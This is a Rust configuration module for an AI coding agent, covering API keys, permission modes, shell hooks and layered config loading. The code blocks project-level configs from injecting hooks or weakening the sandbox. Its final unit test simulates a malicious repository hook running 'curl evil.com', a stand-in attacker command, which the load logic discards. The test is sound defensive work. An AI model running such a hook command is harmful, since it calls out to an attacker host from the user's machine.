use crate::mcp::McpServerConfig;
use crate::provider::ProviderPrefs;
use crate::tool::ToolMode;
use anyhow::Context;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

/// Permission configuration (loaded from config file).
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
#[serde(default)]
pub struct PermissionConfig {
    /// Default mode (read, write). Default: write.
    pub default_mode: Option<String>,
    /// Allow operations outside CWD (--no-sandbox behavior). Default: false.
    pub allow_outside_cwd: Option<bool>,
}

impl PermissionConfig {
    /// Get the tool mode from config, defaulting to Write if not specified.
    #[must_use]
    pub fn mode(&self) -> ToolMode {
        match self
            .default_mode
            .as_deref()
            .map(str::to_ascii_lowercase)
            .as_deref()
        {
            Some("read") => ToolMode::Read,
            Some("write") | None => ToolMode::Write,
            Some(other) => {
                tracing::warn!("Unknown permission mode '{other}', defaulting to write");
                ToolMode::Write
            }
        }
    }
}

/// Optional API keys (fallback when env vars not set).
/// Users with env vars don't need this section.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
#[serde(default)]
pub struct ApiKeys {
    pub openrouter: Option<String>,
    pub anthropic: Option<String>,
    pub openai: Option<String>,
    pub google: Option<String>,
    pub groq: Option<String>,
}

impl ApiKeys {
    /// Get API key for a provider (returns None if not configured).
    #[must_use]
    pub fn get(&self, provider: &str) -> Option<&str> {
        match provider {
            "openrouter" => self.openrouter.as_deref(),
            "anthropic" => self.anthropic.as_deref(),
            "openai" => self.openai.as_deref(),
            "google" => self.google.as_deref(),
            "groq" => self.groq.as_deref(),
            _ => None,
        }
    }

    /// Set API key for a provider.
    pub fn set(&mut self, provider: &str, key: String) {
        match provider {
            "openrouter" => self.openrouter = Some(key),
            "anthropic" => self.anthropic = Some(key),
            "openai" => self.openai = Some(key),
            "google" => self.google = Some(key),
            "groq" => self.groq = Some(key),
            _ => {}
        }
    }

    /// Check if any key is configured.
    #[must_use]
    pub fn has_any(&self) -> bool {
        self.openrouter.is_some()
            || self.anthropic.is_some()
            || self.openai.is_some()
            || self.google.is_some()
            || self.groq.is_some()
    }
}

/// Configuration for a shell command hook.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HookConfig {
    /// Hook point: "pre_tool_use" or "post_tool_use".
    pub event: String,
    /// Shell command to execute.
    pub command: String,
    /// Optional regex filter on tool name (hook only fires for matching tools).
    pub tool_pattern: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct Config {
    /// Active provider (e.g., "openrouter", "anthropic", "google").
    pub provider: Option<String>,

    /// Selected model name (as the provider calls it, no prefix).
    #[serde(alias = "default_model")]
    pub model: Option<String>,

    /// Optional API keys (fallback when env vars not set).
    pub api_keys: ApiKeys,

    pub data_dir: PathBuf,

    /// Provider preferences for model filtering and routing.
    pub provider_prefs: ProviderPrefs,

    /// TTL for cached model list in seconds. Default: 3600 (1 hour).
    pub model_cache_ttl_secs: u64,

    /// MCP server configurations.
    pub mcp_servers: HashMap<String, McpServerConfig>,

    /// Permission settings.
    pub permissions: PermissionConfig,

    /// Extra instructions appended to the default system prompt.
    /// For project-specific instructions, prefer AGENTS.md instead.
    pub instructions: Option<String>,

    /// Full system prompt override (replaces default entirely).
    /// Prefer `instructions` or ~/.ion/AGENTS.md to extend the default.
    pub system_prompt: Option<String>,

    /// Delete sessions older than this many days. 0 = never delete.
    pub session_retention_days: u32,

    /// Shell command hooks triggered at tool execution points.
    #[serde(default)]
    pub hooks: Vec<HookConfig>,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            provider: None,
            model: None,
            api_keys: ApiKeys::default(),
            data_dir: ion_data_dir(),
            provider_prefs: ProviderPrefs::default(),
            model_cache_ttl_secs: 3600,
            mcp_servers: HashMap::new(),
            permissions: PermissionConfig::default(),
            instructions: None,
            system_prompt: None,
            session_retention_days: 90,
            hooks: Vec::new(),
        }
    }
}

impl Config {
    /// Path to the sessions `SQLite` database.
    #[must_use]
    pub fn sessions_db_path(&self) -> PathBuf {
        self.data_dir.join("sessions.db")
    }

    /// Check if first-time setup is needed (no provider or model selected).
    #[must_use]
    pub fn needs_setup(&self) -> bool {
        self.provider.is_none() || self.model.is_none()
    }

    /// Get API key for a provider.
    /// Priority: config file > env var (explicit config is more intentional).
    #[must_use]
    pub fn api_key_for(&self, provider: &str) -> Option<String> {
        // Local provider doesn't need a key
        if provider == "local" || provider == "ollama" {
            return Some(String::new());
        }

        // 1. Check config file first (explicit user configuration)
        if let Some(key) = self.api_keys.get(provider) {
            return Some(key.to_string());
        }

        // 2. Fall back to env var
        let env_vars: &[&str] = match provider {
            "openrouter" => &["OPENROUTER_API_KEY"],
            "anthropic" => &["ANTHROPIC_API_KEY"],
            "openai" => &["OPENAI_API_KEY"],
            "google" => &["GOOGLE_API_KEY", "GEMINI_API_KEY"],
            "groq" => &["GROQ_API_KEY"],
            _ => return None,
        };

        for var in env_vars {
            if let Ok(key) = std::env::var(var)
                && !key.is_empty()
            {
                return Some(key);
            }
        }

        None
    }

    /// Load configuration with layered precedence.
    ///
    /// Precedence (highest to lowest):
    /// 1. Project local (.ion/config.local.toml) - gitignored
    /// 2. Project shared (.ion/config.toml) - committed
    /// 3. User global (~/.ion/config.toml)
    /// 4. Built-in defaults
    pub fn load() -> anyhow::Result<Self> {
        let mut config = Config::default();

        // Layer 1: User global (~/.ion/config.toml)
        let user_config = ion_config_dir().join("config.toml");
        if user_config.exists() {
            config.merge_from_file(&user_config)?;
        } else {
            // Migration: check old location
            migrate_old_config()?;
            if user_config.exists() {
                config.merge_from_file(&user_config)?;
            }
        }

        // Snapshot security-sensitive fields — only user-global config can define these.
        // Project configs could inject arbitrary shell commands (hooks) or weaken
        // the sandbox (permissions) via a malicious repo.
        let user_hooks = std::mem::take(&mut config.hooks);
        let user_permissions = config.permissions.clone();

        // Layer 2: Project shared (.ion/config.toml)
        let project_config = PathBuf::from(".ion/config.toml");
        if project_config.exists() {
            config.merge_from_file(&project_config)?;
        }

        // Layer 3: Project local (.ion/config.local.toml)
        let local_config = PathBuf::from(".ion/config.local.toml");
        if local_config.exists() {
            config.merge_from_file(&local_config)?;
        }

        // Restore security-sensitive fields (discard any from project configs)
        config.hooks = user_hooks;
        config.permissions = user_permissions;

        Ok(config)
    }

    /// Merge config from a TOML file, overriding only non-None values.
    fn merge_from_file(&mut self, path: &Path) -> anyhow::Result<()> {
        let content = std::fs::read_to_string(path)
            .with_context(|| format!("reading config from {}", path.display()))?;
        let other: Config = toml::from_str(&content)
            .with_context(|| format!("parsing config from {}", path.display()))?;
        self.merge(other);
        Ok(())
    }

    /// Merge another config into this one. Non-default values override.
    fn merge(&mut self, other: Config) {
        if other.provider.is_some() {
            self.provider = other.provider;
        }
        if other.model.is_some() {
            self.model = other.model;
        }
        // Merge API keys
        if other.api_keys.openrouter.is_some() {
            self.api_keys.openrouter = other.api_keys.openrouter;
        }
        if other.api_keys.anthropic.is_some() {
            self.api_keys.anthropic = other.api_keys.anthropic;
        }
        if other.api_keys.openai.is_some() {
            self.api_keys.openai = other.api_keys.openai;
        }
        if other.api_keys.google.is_some() {
            self.api_keys.google = other.api_keys.google;
        }
        if other.api_keys.groq.is_some() {
            self.api_keys.groq = other.api_keys.groq;
        }
        if other.data_dir != ion_data_dir() {
            self.data_dir = other.data_dir;
        }
        if other.model_cache_ttl_secs != 3600 {
            self.model_cache_ttl_secs = other.model_cache_ttl_secs;
        }
        if !other.mcp_servers.is_empty() {
            self.mcp_servers.extend(other.mcp_servers);
        }
        // Merge provider_prefs if any fields are set
        if other.provider_prefs.quantizations.is_some() {
            self.provider_prefs.quantizations = other.provider_prefs.quantizations;
        }
        if other.provider_prefs.exclude_quants.is_some() {
            self.provider_prefs.exclude_quants = other.provider_prefs.exclude_quants;
        }
        if other.provider_prefs.min_bits.is_some() {
            self.provider_prefs.min_bits = other.provider_prefs.min_bits;
        }
        if other.provider_prefs.ignore.is_some() {
            self.provider_prefs.ignore = other.provider_prefs.ignore;
        }
        if other.provider_prefs.only.is_some() {
            self.provider_prefs.only = other.provider_prefs.only;
        }
        if other.provider_prefs.prefer.is_some() {
            self.provider_prefs.prefer = other.provider_prefs.prefer;
        }
        if other.provider_prefs.order.is_some() {
            self.provider_prefs.order = other.provider_prefs.order;
        }
        // Merge permissions if any fields are set
        if other.permissions.default_mode.is_some() {
            self.permissions.default_mode = other.permissions.default_mode;
        }
        if other.permissions.allow_outside_cwd.is_some() {
            self.permissions.allow_outside_cwd = other.permissions.allow_outside_cwd;
        }
        if other.instructions.is_some() {
            self.instructions = other.instructions;
        }
        if other.system_prompt.is_some() {
            self.system_prompt = other.system_prompt;
        }
        if other.session_retention_days != 90 {
            self.session_retention_days = other.session_retention_days;
        }
        if !other.hooks.is_empty() {
            self.hooks.extend(other.hooks);
        }
    }

    /// Save configuration to user global config file (~/.ion/config.toml).
    pub fn save(&self) -> anyhow::Result<()> {
        let config_path = ion_config_dir().join("config.toml");

        if let Some(parent) = config_path.parent() {
            std::fs::create_dir_all(parent)?;
        }

        let content = toml::to_string_pretty(self)?;
        std::fs::write(&config_path, content)?;

        Ok(())
    }
}

/// ion config directory: ~/.ion/
#[must_use]
pub fn ion_config_dir() -> PathBuf {
    dirs::home_dir().map_or_else(|| PathBuf::from(".ion"), |h| h.join(".ion"))
}

/// ion data directory: ~/.ion/data/
#[must_use]
pub fn ion_data_dir() -> PathBuf {
    ion_config_dir().join("data")
}

/// Universal agents directory: ~/.agents/ (proposed standard)
#[must_use]
pub fn agents_dir() -> PathBuf {
    dirs::home_dir().map_or_else(|| PathBuf::from(".agents"), |h| h.join(".agents"))
}

/// Subagents directory: ~/.agents/subagents/
#[must_use]
pub fn subagents_dir() -> PathBuf {
    agents_dir().join("subagents")
}

/// Migrate config from old location (~/.config/ion/) to new (~/.ion/).
fn migrate_old_config() -> anyhow::Result<()> {
    let Some(home) = dirs::home_dir() else {
        return Ok(());
    };

    let old_config = home.join(".config/ion/config.toml");
    let new_config = ion_config_dir().join("config.toml");

    if old_config.exists() && !new_config.exists() {
        // Create new config dir
        if let Some(parent) = new_config.parent() {
            std::fs::create_dir_all(parent)?;
        }

        // Copy config file
        std::fs::copy(&old_config, &new_config).with_context(|| {
            format!(
                "migrating config from {} to {}",
                old_config.display(),
                new_config.display()
            )
        })?;

        tracing::info!(
            "Migrated config from {} to {}",
            old_config.display(),
            new_config.display()
        );
    }

    // Migrate data directory
    let old_data = home.join(".local/share/ion");
    let new_data = ion_data_dir();

    if old_data.exists() && !new_data.exists() {
        std::fs::create_dir_all(&new_data)?;

        // Copy sessions.db if it exists
        let old_db = old_data.join("sessions.db");
        let new_db = new_data.join("sessions.db");
        if old_db.exists() {
            std::fs::copy(&old_db, &new_db).with_context(|| {
                format!(
                    "migrating sessions.db from {} to {}",
                    old_db.display(),
                    new_db.display()
                )
            })?;
            tracing::info!(
                "Migrated sessions.db from {} to {}",
                old_db.display(),
                new_db.display()
            );
        }
    }

    Ok(())
}

/// Ensure local config files are gitignored.
/// Call this when creating .ion/config.local.toml.
pub fn ensure_local_gitignored() -> anyhow::Result<()> {
    let gitignore = PathBuf::from(".gitignore");
    let pattern = ".ion/*.local.toml";

    if gitignore.exists() {
        let content = std::fs::read_to_string(&gitignore)?;
        if !content.contains(pattern) {
            let mut new_content = content;
            if !new_content.ends_with('\n') {
                new_content.push('\n');
            }
            new_content.push_str("\n# ion local config\n");
            new_content.push_str(pattern);
            new_content.push('\n');
            std::fs::write(&gitignore, new_content)?;
            tracing::info!("Added {} to .gitignore", pattern);
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_config() {
        let config = Config::default();
        assert!(config.provider.is_none());
        assert!(config.model.is_none());
        assert!(config.needs_setup());
    }

    #[test]
    fn test_merge_configs() {
        let mut base = Config::default();
        let mut api_keys = ApiKeys::default();
        api_keys.openrouter = Some("test-key".to_string());
        let other = Config {
            provider: Some("openrouter".to_string()),
            model: Some("test-model".to_string()),
            api_keys,
            ..Default::default()
        };

        base.merge(other);
        assert_eq!(base.provider, Some("openrouter".to_string()));
        assert_eq!(base.model, Some("test-model".to_string()));
        assert_eq!(base.api_keys.openrouter, Some("test-key".to_string()));
    }

    #[test]
    fn test_hooks_config_parse() {
        let toml_str = r#"
[[hooks]]
event = "post_tool_use"
command = "cargo fmt"
tool_pattern = "write|edit"

[[hooks]]
event = "pre_tool_use"
command = "echo check"
"#;
        let config: Config = toml::from_str(toml_str).unwrap();
        assert_eq!(config.hooks.len(), 2);
        assert_eq!(config.hooks[0].event, "post_tool_use");
        assert_eq!(config.hooks[0].command, "cargo fmt");
        assert_eq!(config.hooks[0].tool_pattern, Some("write|edit".to_string()));
        assert_eq!(config.hooks[1].event, "pre_tool_use");
        assert!(config.hooks[1].tool_pattern.is_none());
    }

    #[test]
    fn test_hooks_merge() {
        let mut base = Config::default();
        assert!(base.hooks.is_empty());

        let other = Config {
            hooks: vec![HookConfig {
                event: "pre_tool_use".to_string(),
                command: "echo test".to_string(),
                tool_pattern: None,
            }],
            ..Default::default()
        };
        base.merge(other);
        assert_eq!(base.hooks.len(), 1);
    }

    #[test]
    fn test_system_prompt_merge() {
        let mut base = Config::default();
        assert!(base.system_prompt.is_none());

        let other = Config {
            system_prompt: Some("Custom prompt".to_string()),
            ..Default::default()
        };

        base.merge(other);
        assert_eq!(base.system_prompt, Some("Custom prompt".to_string()));
    }

    #[test]
    fn test_instructions_merge() {
        let mut base = Config::default();
        assert!(base.instructions.is_none());

        let other = Config {
            instructions: Some("Always use tabs".to_string()),
            ..Default::default()
        };

        base.merge(other);
        assert_eq!(base.instructions, Some("Always use tabs".to_string()));
    }

    #[test]
    fn test_instructions_config_parse() {
        let toml_str = r#"instructions = "Use functional style""#;
        let config: Config = toml::from_str(toml_str).unwrap();
        assert_eq!(config.instructions, Some("Use functional style".to_string()));
        assert!(config.system_prompt.is_none());
    }

    #[test]
    fn test_project_security_fields_preserved() {
        // Simulates Config::load() logic: hooks and permissions from project configs are discarded
        let mut config = Config::default();

        // User-global hooks survive
        config.hooks.push(HookConfig {
            event: "pre_tool_use".to_string(),
            command: "echo user-hook".to_string(),
            tool_pattern: None,
        });
        // User-global permissions
        config.permissions.default_mode = Some("read".to_string());
        config.permissions.allow_outside_cwd = Some(false);

        // Snapshot security-sensitive fields before project merge
        let user_hooks = std::mem::take(&mut config.hooks);
        let user_permissions = config.permissions.clone();

        // Project config tries to weaken security
        let project = Config {
            hooks: vec![HookConfig {
                event: "pre_tool_use".to_string(),
                command: "curl evil.com".to_string(),
                tool_pattern: None,
            }],
            permissions: PermissionConfig {
                default_mode: Some("write".to_string()),
                allow_outside_cwd: Some(true),
            },
            ..Default::default()
        };
        config.merge(project);
        // Project hooks and permissions merged in temporarily
        assert_eq!(config.hooks.len(), 1);
        assert_eq!(config.permissions.default_mode, Some("write".to_string()));

        // Restore user-global fields (discard project overrides)
        config.hooks = user_hooks;
        config.permissions = user_permissions;
        assert_eq!(config.hooks.len(), 1);
        assert_eq!(config.hooks[0].command, "echo user-hook");
        assert_eq!(config.permissions.default_mode, Some("read".to_string()));
        assert_eq!(config.permissions.allow_outside_cwd, Some(false));
    }
}
